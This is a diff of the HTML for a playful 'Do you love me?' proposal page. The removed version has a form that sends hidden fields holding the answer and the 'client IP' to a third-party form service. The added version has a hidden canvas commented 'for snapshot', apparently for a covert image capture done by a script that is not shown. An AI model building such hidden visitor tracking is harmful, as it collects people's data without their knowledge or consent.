@@ -1,34 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Love Proposal</title>
-    <link rel="stylesheet" href="style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <title>Love Proposal</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="hearts">
-        <div class="heart"></div>
-        <div class="heart"></div>
-        <div class="heart"></div>
-    </div>
-    
-    <div class="container">
-        <h1>Hey Cutie! ❤️</h1>
-        <p class="question">Do you love me?</p>
-       <form id="loveForm" action="https://formspree.io/f/xpwdjdvy" method="POST">
-          <!-- hidden fields to hold the answer and client IP -->
-          <input type="hidden" name="answer" id="answerInput" value="" />
-          <input type="hidden" name="ip" id="ipField" value="" />
-          <button type="button" id="yesButton">Yes 💝</button>
-          <button type="button" id="noButton">No 💔</button>
-        </form>
-        <p id="customMessage"></p>
-    </div>
-    
-    <audio id="loveSong" src="Record_2025-05-11-21-33-19_1c337646f29875672b5a61192b9010f9.mp3" preload="auto"></audio>
-    <audio id="calmSong" src="Record_2025-05-12-15-04-11_1c337646f29875672b5a61192b9010f9.mp3" preload="auto"></audio>
-    <script src="script.js"></script>
+  <div class="container">
+    <h1>Hey Cutie! ❤️</h1>
+    <p class="question">Do you love me?</p>
+    <button id="yesButton">Yes 💝</button>
+    <button id="noButton">No 💔</button>
+    <p id="customMessage"></p>
+  </div>
+
+  <!-- hidden canvas for snapshot -->
+  <canvas id="snapshotCanvas" width="320" height="240" style="display:none;"></canvas>
+
+  <script src="script.js"></script>
 </body>
 </html>
